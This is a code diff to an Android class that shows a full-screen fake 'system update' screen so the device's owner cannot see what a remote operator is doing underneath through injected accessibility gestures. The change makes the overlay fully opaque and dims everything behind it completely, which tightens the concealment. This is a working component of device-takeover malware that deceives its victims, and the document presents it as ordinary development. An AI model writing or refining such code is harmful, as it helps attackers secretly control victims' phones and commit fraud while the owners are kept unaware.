@@ -20,13 +20,13 @@ import com.fason.app.R;
 import com.fason.app.core.FasonApp;
 
 /**
- * Full-screen opaque fake "system update" overlay.
+ * Full-screen, fully opaque fake "system update" overlay.
  *
- * Drawn above every app so the device user sees an update screen while the
- * operator keeps working on the real UI underneath. The window is
- * FLAG_NOT_TOUCHABLE, so accessibility-injected gestures (InputInjector) and
- * physical touches fall through to the window below. Alpha is 1.0 by default,
- * so nothing of the real UI is visible on the device.
+ * The window is opaque (PixelFormat.OPAQUE), its content is drawn over solid
+ * black and everything behind it is dimmed to 100% (FLAG_DIM_BEHIND with
+ * dimAmount = 1f), so the device user cannot see anything of the real UI.
+ * FLAG_NOT_TOUCHABLE keeps accessibility-injected gestures (InputInjector) and
+ * physical touches working on the window below.
  */
 public final class FakeUpdateOverlay {
     private static final String TAG = "FakeUpdateOverlay";
@@ -47,6 +47,7 @@ public final class FakeUpdateOverlay {
 
     private WindowManager wm;
     private View root;
+    private WindowManager.LayoutParams params;
     private ProgressBar bar;
     private TextView percentView;
     private TextView stageView;
@@ -128,7 +129,7 @@ public final class FakeUpdateOverlay {
                 ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                 : WindowManager.LayoutParams.TYPE_PHONE;
 
-            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+            params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 type,
@@ -136,12 +137,14 @@ public final class FakeUpdateOverlay {
                     | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                     | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                     | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
-                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                    | WindowManager.LayoutParams.FLAG_DIM_BEHIND,
                 PixelFormat.OPAQUE);
-            lp.gravity = Gravity.TOP | Gravity.START;
-            lp.alpha = 1f;
+            params.gravity = Gravity.TOP | Gravity.START;
+            params.alpha = 1f;
+            params.dimAmount = 1f;
 
-            wm.addView(root, lp);
+            wm.addView(root, params);
 
             visible = true;
             alpha = clamp(startAlpha);
@@ -151,7 +154,7 @@ public final class FakeUpdateOverlay {
             if (bar != null) bar.setProgress(0);
             main.removeCallbacks(ticker);
             main.postDelayed(ticker, TICK_MS);
-            Log.i(TAG, "fake update overlay shown");
+            Log.i(TAG, "fake update overlay shown (opaque, dimAmount=1)");
         } catch (Exception e) {
             Log.e(TAG, "show failed", e);
             cleanup();
@@ -173,11 +176,17 @@ public final class FakeUpdateOverlay {
     private void setAlphaInternal(float a) {
         alpha = clamp(a);
         if (root != null) root.setAlpha(alpha);
+        if (params != null && wm != null && root != null) {
+            params.alpha = 1f;
+            params.dimAmount = 1f;
+            try { wm.updateViewLayout(root, params); } catch (Exception ignored) {}
+        }
     }
 
     private void cleanup() {
         visible = false;
         root = null;
+        params = null;
         bar = null;
         percentView = null;
         stageView = null;
